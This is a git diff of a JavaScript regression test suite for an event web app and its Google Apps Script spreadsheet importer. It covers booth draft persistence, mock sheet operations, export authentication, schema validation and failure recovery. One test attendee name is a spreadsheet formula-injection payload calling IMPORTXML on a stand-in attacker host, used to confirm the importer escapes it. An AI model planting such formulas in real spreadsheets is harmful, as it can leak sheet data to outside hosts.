+  ["ArrowRight", "ArrowLeft", "ArrowDown", "ArrowUp", "Home", "End"].forEach((key) => {
+    assert.match(artStaffSource, new RegExp(`event\\.key === "${key}"`));
+  });
 
   // New Song is a dedicated, server-authoritative poll rather than the old
   // self-paced booth draft. The attendee sees one leader-controlled phase at
@@ -3231,7 +4305,7 @@ async function runFrontendContractRegression() {
   assert.match(boothStaffCommon, /EventSchedule\.groupForBooth/);
   assert.match(boothStaffCommon, /data\.songVotes/);
   assert.doesNotMatch(boothStaffCommon, /EventAPI\.dashboardData\(/);
-  ["story", "art"].forEach((boothId) => {
+  ["story"].forEach((boothId) => {
     const source = fs.readFileSync(path.join(__dirname, "..", "..", "web", "phase2-staff", `${boothId}.html`), "utf8");
     assert.match(source, new RegExp(`initBoothStaff\\("${boothId}"\\)`));
     assert.match(source, /id="staff-settings"/);
@@ -3264,31 +4338,30 @@ function runBoothDraftPersistenceRegression() {
   vm.runInContext(`${journeySource}\nthis.__journeyState = JourneyState;`, context);
   const journey = context.__journeyState;
 
-  assert.equal(journey.save("booth.art.activity", { index: 2, drafts: { reflect: "Hope" } }), true);
-  let loaded = journey.load("booth.art.activity", {});
+  assert.equal(journey.save("booth.story.activity", { index: 2, drafts: { reflect: "Hope" } }), true);
+  let loaded = journey.load("booth.story.activity", {});
   assert.equal(loaded.index, 2);
   assert.equal(loaded.drafts.reflect, "Hope");
   loaded.drafts.reflect = "mutated outside the store";
-  assert.equal(journey.load("booth.art.activity", {}).drafts.reflect, "Hope");
+  assert.equal(journey.load("booth.story.activity", {}).drafts.reflect, "Hope");
 
   activeAttendeeId = "draft-attendee-b";
-  assert.equal(journey.load("booth.art.activity", null), null);
-  journey.save("booth.art.activity", { index: 1, drafts: { reflect: "Joy" } });
+  assert.equal(journey.load("booth.story.activity", null), null);
+  journey.save("booth.story.activity", { index: 1, drafts: { reflect: "Joy" } });
   activeAttendeeId = "draft-attendee-a";
-  assert.equal(journey.load("booth.art.activity", {}).index, 2);
-  journey.remove("booth.art.activity");
-  assert.equal(journey.load("booth.art.activity", null), null);
+  assert.equal(journey.load("booth.story.activity", {}).index, 2);
+  journey.remove("booth.story.activity");
+  assert.equal(journey.load("booth.story.activity", null), null);
 
   const boothCommonSource = fs.readFileSync(
     path.join(__dirname, "..", "..", "web", "shared", "booth-common.js"),
     "utf8"
   );
-  assert.match(boothCommonSource, /JourneyState\.load\(boothFooterDraftScope/);
-  assert.match(boothCommonSource, /JourneyState\.save\(boothFooterDraftScope/);
-  assert.match(boothCommonSource, /note\.addEventListener\("input"/);
-  assert.match(boothCommonSource, /rating: _boothStars/);
+  assert.doesNotMatch(boothCommonSource, /boothFooterDraftScope|_boothStars|paintBoothStars/);
+  assert.doesNotMatch(boothCommonSource, /["']booth-(?:note|stars)["']/);
+  assert.doesNotMatch(boothCommonSource, /\brating\s*:|\bnote\s*:/);
 
-  ["story", "art"].forEach((boothId) => {
+  ["story"].forEach((boothId) => {
     const source = fs.readFileSync(
       path.join(__dirname, "..", "..", "web", "phase2-booths", `booth-${boothId}.html`),
       "utf8"
@@ -3302,7 +4375,7 @@ function runBoothDraftPersistenceRegression() {
     assert.match(source, /_DRAFT_SCOPE = `booth\.\$\{BOOTH_ID\}\.activity`/);
     assert.match(source, /JourneyState\.load\(/);
     assert.match(source, /JourneyState\.save\(/);
-    assert.match(source, /renderBoothFooter\(BOOTH_ID\)/);
+    assert.doesNotMatch(source, /renderBoothFooter\(|id="booth-note"|id="booth-stars"|Rate this booth/);
   });
 
   // Bible Bowl is the deliberate exception: answers and score restoration
@@ -3325,6 +4398,19 @@ function runBoothDraftPersistenceRegression() {
   assert.doesNotMatch(heavenSource, /_DRAFT_SCOPE|setHeavenPage|JourneyState\.(?:load|save)\(|renderBoothFooter\(/);
   assert.match(heavenSource, /shared\/heaven-attendee\.js/);
 
+  // Art Therapy is paced entirely by its leader too. Refresh restoration is
+  // authoritative on the active session/run; no old reflection draft or
+  // self-paced slide index can override the current published phase.
+  const artSource = fs.readFileSync(
+    path.join(__dirname, "..", "..", "web", "phase2-booths", "booth-art.html"),
+    "utf8"
+  );
+  assert.doesNotMatch(
+    artSource,
+    /_DRAFT_SCOPE|ART_BEATS|JourneyState\.(?:load|save)\(|renderBoothFooter\(|btn-art-(?:next|prev)/
+  );
+  assert.match(artSource, /shared\/art-attendee\.js/);
+
   // New Song restores its active run and locked vote from the backend too.
   // It does not revive the old local poll index or generic rating footer.
   const newSongSource = fs.readFileSync(
@@ -3337,14 +4423,74 @@ function runBoothDraftPersistenceRegression() {
 
 function runAppsScriptRegression() {
   class MockSheet {
-    constructor() { this.rows = []; }
+    constructor() {
+      this.rows = [];
+      this.maxRows = 1000;
+      this.maxColumns = 26;
+      this.failNextSetValues = false;
+    }
+    ensureCell(row, column) {
+      while (this.rows.length < row) this.rows.push([]);
+      while (this.rows[row - 1].length < column) this.rows[row - 1].push("");
+    }
     appendRow(values) { this.rows.push(values.slice()); }
     setFrozenRows() {}
     getDataRange() {
       return { getValues: () => this.rows.map((row) => row.slice()) };
     }
-    getRange(row, column) {
-      return { setValue: (value) => { this.rows[row - 1][column - 1] = value; } };
+    getMaxRows() { return this.maxRows; }
+    getMaxColumns() { return this.maxColumns; }
+    insertRowsAfter(_afterPosition, howMany) { this.maxRows += howMany; }
+    insertColumnsAfter(_afterPosition, howMany) { this.maxColumns += howMany; }
+    getLastRow() {
+      let last = 0;
+      this.rows.forEach((row, index) => {
+        if (row.some((value) => value !== "" && value !== null && value !== undefined)) last = index + 1;
+      });
+      return last;
+    }
+    getLastColumn() {
+      let last = 0;
+      this.rows.forEach((row) => {
+        row.forEach((value, index) => {
+          if (value !== "" && value !== null && value !== undefined) last = Math.max(last, index + 1);
+        });
+      });
+      return last;
+    }
+    getRange(row, column, rowCount = 1, columnCount = 1) {
+      const sheet = this;
+      return {
+        setValue(value) {
+          sheet.ensureCell(row, column);
+          sheet.rows[row - 1][column - 1] = value;
+          return this;
+        },
+        setValues(values) {
+          if (sheet.failNextSetValues) {
+            sheet.failNextSetValues = false;
+            throw new Error("mock setValues failed");
+          }
+          assert.equal(values.length, rowCount);
+          values.forEach((valuesRow, rowIndex) => {
+            assert.equal(valuesRow.length, columnCount);
+            valuesRow.forEach((value, columnIndex) => {
+              sheet.ensureCell(row + rowIndex, column + columnIndex);
+              sheet.rows[row - 1 + rowIndex][column - 1 + columnIndex] = value;
+            });
+          });
+          return this;
+        },
+        clearContent() {
+          for (let rowOffset = 0; rowOffset < rowCount; rowOffset += 1) {
+            for (let columnOffset = 0; columnOffset < columnCount; columnOffset += 1) {
+              sheet.ensureCell(row + rowOffset, column + columnOffset);
+              sheet.rows[row - 1 + rowOffset][column - 1 + columnOffset] = "";
+            }
+          }
+          return this;
+        },
+      };
     }
     deleteRow(row) { this.rows.splice(row - 1, 1); }
   }
@@ -3392,7 +4538,13 @@ function runAppsScriptRegression() {
       },
     },
     PropertiesService: {
-      getScriptProperties: () => ({ getProperty: (key) => key === "ORGANIZER_KEY" ? "gas-organizer-key" : null }),
+      getScriptProperties: () => ({
+        getProperty: (key) => {
+          if (key === "ORGANIZER_KEY") return "gas-organizer-key";
+          if (key === "EXPORT_KEY") return "gas-export-key";
+          return null;
+        },
+      }),
     },
     Utilities: { getUuid: () => `gas-id-${++uuidCounter}` },
     ContentService: {
@@ -3421,8 +4573,10 @@ function runAppsScriptRegression() {
     actionBoothPresentation,
     actionUpdateBoothPresentation,
     actionBoothDashboardData,
+    actionImportNodeSnapshot,
     actionMyCheckins,
     actionMySignupSelections,
+    nodeExportSchemas: NODE_EXPORT_SCHEMAS,
     sheetSafeValue,
     nextRaffleNumber,
     withScriptLock,
@@ -3793,6 +4947,193 @@ function runAppsScriptRegression() {
     assert.equal(output.mimeType, "json");
     return JSON.parse(output.content);
   }
+
+  function nodeExportPayload() {
+    return {
+      exportKey: "gas-export-key",
+      snapshot: {
+        generatedAt: "2026-07-18T20:15:00.000Z",
+        dataResetAt: "initial",
+        tabs: Object.fromEntries(Object.entries(EXPECTED_SHEETS_TAB_HEADERS).map(([name, headers]) => [
+          name,
+          { headers: headers.slice(), rows: [] },
+        ])),
+      },
+    };
+  }
+
+  function clonePayload(payload) {
+    return JSON.parse(JSON.stringify(payload));
+  }
+
+  const liveSheetNames = Object.keys(EXPECTED_SHEETS_TAB_HEADERS).map((name) => `Live_${name}`);
+  const liveSheetsAbsent = () => liveSheetNames.every((name) => spreadsheet.getSheetByName(name) === null);
+
+  // The Node export has a distinct server-only credential. Supplying even the
+  // valid organizer key must fail before acquiring the global Script lock.
+  const beforeBadExportAuth = lockState.acquisitions;
+  assert.throws(
+    () => gas.actionImportNodeSnapshot(Object.assign(nodeExportPayload(), {
+      exportKey: "gas-organizer-key",
+    })),
+    (error) => error.code === "EXPORT_AUTH_REQUIRED"
+  );
+  assert.equal(lockState.acquisitions, beforeBadExportAuth);
+  assert.equal(liveSheetsAbsent(), true);
+
+  // Every logical tab and header is allowlisted. Validation covers the whole
+  // payload before the first Live_* sheet is created or changed.
+  const wrongHeaders = nodeExportPayload();
+  wrongHeaders.snapshot.tabs.Attendees.headers[0] = "unexpectedId";
+  assert.throws(
+    () => gas.actionImportNodeSnapshot(wrongHeaders),
+    (error) => error.code === "INVALID_EXPORT_SNAPSHOT"
+  );
+  assert.equal(liveSheetsAbsent(), true);
+  const unexpectedTab = nodeExportPayload();
+  unexpectedTab.snapshot.tabs.Unexpected = { headers: [], rows: [] };
+  assert.throws(
+    () => gas.actionImportNodeSnapshot(unexpectedTab),
+    (error) => error.code === "INVALID_EXPORT_SNAPSHOT"
+  );
+  assert.equal(liveSheetsAbsent(), true);
+  const wrongRowWidth = nodeExportPayload();
+  wrongRowWidth.snapshot.tabs.Attendees.rows = [["too-short"]];
+  assert.throws(
+    () => gas.actionImportNodeSnapshot(wrongRowWidth),
+    (error) => error.code === "INVALID_EXPORT_SNAPSHOT"
+  );
+  assert.equal(liveSheetsAbsent(), true);
+
+  const legacyRowsBeforeExport = {
+    Attendees: JSON.stringify(spreadsheet.getSheetByName("Attendees").rows),
+    SignUps: JSON.stringify(spreadsheet.getSheetByName("SignUps").rows),
+    SongVotes: JSON.stringify(spreadsheet.getSheetByName("SongVotes").rows),
+  };
+  const firstSnapshot = nodeExportPayload();
+  firstSnapshot.snapshot.tabs.Attendees.rows = [
+    [
+      "node-a", "[]", "=IMPORTXML(\"https://attacker.example\")", "6155550303", "2001",
+      "blue", "2026-07-18T20:00:00.000Z", "2026-07-18T20:01:00.000Z", "",
+      "[\"heaven\"]", 1, "[\"future\"]",
+    ],
+    [
+      "node-b", "[]", "Second Attendee", "6155550404", "2002", "red",
+      "2026-07-18T20:02:00.000Z", "2026-07-18T20:03:00.000Z", "", "[]", 0, "[]",
+    ],
+  ];
+  firstSnapshot.snapshot.tabs.SignUps.rows = [[
+    "signup-a", "node-a", "First Attendee", "6155550303", "2001", "blue", "future",
+    "Keep me posted on future events", "2026-07-18T20:10:00.000Z", false, "", "",
+  ]];
+  firstSnapshot.snapshot.tabs.ExportMeta.rows = [
+    ["schemaVersion", 1],
+    ["generatedAt", firstSnapshot.snapshot.generatedAt],
+    ["dataResetAt", firstSnapshot.snapshot.dataResetAt],
+  ];
+  result = gas.actionImportNodeSnapshot(firstSnapshot);
+  assert.equal(result.ok, true);
+  assert.equal(result.rowCounts.Attendees, 2);
+  assert.equal(result.rowCounts.SignUps, 1);
+  assertIsoTimestamp(result.importedAt, "Apps Script Node export importedAt");
+  liveSheetNames.forEach((name) => assert.ok(spreadsheet.getSheetByName(name), name));
+  assert.equal(spreadsheet.getSheetByName("BoothResults"), null);
+  assert.equal(JSON.stringify(spreadsheet.getSheetByName("Attendees").rows), legacyRowsBeforeExport.Attendees);
+  assert.equal(JSON.stringify(spreadsheet.getSheetByName("SignUps").rows), legacyRowsBeforeExport.SignUps);
+  assert.equal(JSON.stringify(spreadsheet.getSheetByName("SongVotes").rows), legacyRowsBeforeExport.SongVotes);
+
+  const liveAttendees = spreadsheet.getSheetByName("Live_Attendees");
+  const attendeeHeaders = EXPECTED_SHEETS_TAB_HEADERS.Attendees;
+  assert.deepEqual(liveAttendees.rows[0], attendeeHeaders);
+  assert.equal(
+    liveAttendees.rows[1][attendeeHeaders.indexOf("name")],
+    "'=IMPORTXML(\"https://attacker.example\")"
+  );
+
+  // A smaller full snapshot overwrites the current matrix, removes old data
+  // rows, and clears columns left behind by an older schema. Exercise this
+  // through doPost as well so the bound Web App path remains wired.
+  const obsoleteColumn = attendeeHeaders.length;
+  liveAttendees.ensureCell(1, obsoleteColumn + 1);
+  liveAttendees.ensureCell(2, obsoleteColumn + 1);
+  liveAttendees.rows[0][obsoleteColumn] = "obsoleteColumn";
+  liveAttendees.rows[1][obsoleteColumn] = "stale value";
+  const smallerSnapshot = nodeExportPayload();
+  smallerSnapshot.snapshot.generatedAt = "2026-07-18T20:16:00.000Z";
+  smallerSnapshot.snapshot.tabs.Attendees.rows = [[
+    "node-a", "[]", "Current Attendee", "6155550303", "2001", "blue",
+    "2026-07-18T20:00:00.000Z", "2026-07-18T20:01:00.000Z", "", "[]", 0, "[]",
+  ]];
+  smallerSnapshot.snapshot.tabs.ExportMeta.rows = [
+    ["schemaVersion", 1],
+    ["generatedAt", smallerSnapshot.snapshot.generatedAt],
+    ["dataResetAt", smallerSnapshot.snapshot.dataResetAt],
+  ];
+  const postedImport = post("importNodeSnapshot", smallerSnapshot);
+  assert.equal(postedImport.ok, true);
+  assert.equal(postedImport.rowCounts.Attendees, 1);
+  assert.equal(postedImport.rowCounts.SignUps, 0);
+  assert.equal(liveAttendees.getLastRow(), 2);
+  assert.equal(liveAttendees.rows[0][obsoleteColumn], "");
+  assert.equal(liveAttendees.rows[1][obsoleteColumn], "");
+  assert.equal(liveAttendees.rows[2].every((value) => value === ""), true);
+  assert.equal(spreadsheet.getSheetByName("Live_SignUps").getLastRow(), 1);
+
+  // Data tabs are written in a fixed order and ExportMeta is the final commit
+  // marker. A transient failure on a later tab may expose a temporary mixed
+  // generation, but the marker must remain on the prior complete snapshot;
+  // the next full retry reconciles every tab and advances it.
+  const liveTriviaAnswers = spreadsheet.getSheetByName("Live_TriviaAnswers");
+  const liveExportMeta = spreadsheet.getSheetByName("Live_ExportMeta");
+  const liveMetaValue = (key) => {
+    const row = liveExportMeta.rows.find((candidate) => candidate[0] === key);
+    return row ? row[1] : undefined;
+  };
+  assert.equal(liveMetaValue("generatedAt"), "2026-07-18T20:16:00.000Z");
+  const interruptedSnapshot = clonePayload(smallerSnapshot);
+  interruptedSnapshot.snapshot.generatedAt = "2026-07-18T20:17:00.000Z";
+  interruptedSnapshot.snapshot.tabs.Attendees.rows[0][0] = "new-generation-attendee";
+  interruptedSnapshot.snapshot.tabs.TriviaAnswers.rows = [[
+    "answer-new", "new-generation-attendee", "Current Attendee", "2001", "blue",
+    1, "trivia-session-1-run-1", 1, "question-1", 1, 0, true,
+    "2026-07-18T20:16:30.000Z",
+  ]];
+  interruptedSnapshot.snapshot.tabs.ExportMeta.rows = [
+    ["schemaVersion", 1],
+    ["generatedAt", interruptedSnapshot.snapshot.generatedAt],
+    ["dataResetAt", interruptedSnapshot.snapshot.dataResetAt],
+  ];
+  liveTriviaAnswers.failNextSetValues = true;
+  assert.throws(
+    () => gas.actionImportNodeSnapshot(interruptedSnapshot),
+    /mock setValues failed/
+  );
+  assert.equal(liveAttendees.rows[1][0], "new-generation-attendee");
+  assert.equal(liveTriviaAnswers.getLastRow(), 1);
+  assert.equal(liveMetaValue("generatedAt"), "2026-07-18T20:16:00.000Z");
+  result = gas.actionImportNodeSnapshot(interruptedSnapshot);
+  assert.equal(result.ok, true);
+  assert.equal(liveTriviaAnswers.getLastRow(), 2);
+  assert.equal(liveMetaValue("generatedAt"), "2026-07-18T20:17:00.000Z");
+
+  // The importer writes first and cleans up second. If the new setValues call
+  // fails, the last complete snapshot must remain visible and the lock must
+  // still be released for the exporter's retry.
+  const previousLiveAttendees = JSON.stringify(liveAttendees.rows);
+  const failedSnapshot = clonePayload(smallerSnapshot);
+  failedSnapshot.snapshot.generatedAt = "2026-07-18T20:18:00.000Z";
+  failedSnapshot.snapshot.tabs.Attendees.rows[0][0] = "must-not-replace-current";
+  liveAttendees.failNextSetValues = true;
+  const beforeFailedWrite = lockState.acquisitions;
+  assert.throws(
+    () => gas.actionImportNodeSnapshot(failedSnapshot),
+    /mock setValues failed/
+  );
+  assert.equal(lockState.acquisitions, beforeFailedWrite + 1);
+  assert.equal(lockState.releases, lockState.acquisitions);
+  assert.equal(lockState.held, false);
+  assert.equal(JSON.stringify(liveAttendees.rows), previousLiveAttendees);
+
   assert.equal(post("registerAttendee", { attendeeId: "gas-http-entry", name: "HTTP" }).raffleNumber, "1004");
   assert.equal(post("loginAttendee", { name: "HTTP", raffleNumber: "1004", portal: "phase3" }).attendeeId, "gas-http-entry");
   assert.equal(post("saveSongVote", { attendeeId: "gas-http-entry", songTitle: "Firm Foundation" }).songTitle, "Firm Foundation");
@@ -3827,12 +5168,15 @@ function runAppsScriptRegression() {
 async function main() {
   try {
     runInlineScriptSyntaxRegression();
+    await runGoogleSheetsExporterRegression();
     startServer(0);
     await once(server, "listening");
     const port = server.address().port;
+    await runGoogleSheetsExportApiRegression(port);
     await runApiRegression(port);
     await runTriviaApiRegression(port);
     await runHeavenApiRegression(port);
+    await runArtApiRegression(port);
     await runNewSongApiRegression(port);
     await runCapacityRegression(port);
     await runFrontendContractRegression();
